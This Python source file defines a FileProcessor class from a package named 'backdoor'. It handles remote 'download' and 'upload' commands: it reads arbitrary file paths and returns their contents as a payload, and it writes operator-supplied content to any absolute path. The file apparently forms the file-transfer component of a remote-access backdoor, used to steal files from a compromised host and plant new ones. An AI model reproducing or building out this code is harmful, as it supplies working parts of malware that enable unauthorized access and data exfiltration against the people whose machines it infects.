from pathlib import Path
from backdoor.files.io import FileReader, FileWriter
from backdoor.models.commands import Command, CommandResult


class FileProcessor:

    def __init__(self, file_writer: FileWriter, file_reader: FileReader) -> None:
        self.file_writer = file_writer
        self.file_reader = file_reader

    def download(self, command: Command) -> CommandResult:
        if not command.args:
            raise ValueError("err: file path not provided")
        path = command.args[0]
        try:
            content = self.file_reader.read(path)
        except ValueError as e:
            raise ValueError(f"err: {e}")
        return CommandResult(
            success=True,
            returncode=0,
            payload=content,
        )

    def upload(self, command: Command) -> CommandResult:
        if not command.args:
            raise ValueError("err: file name not provided")
        if not command.payload:
            raise ValueError("err: file content not provided")
        file_name = command.args[0]
        file_path = str(Path(file_name).absolute())
        self.file_writer.write(command.payload, file_path)
        return CommandResult(success=True, returncode=0, stdout=file_path)
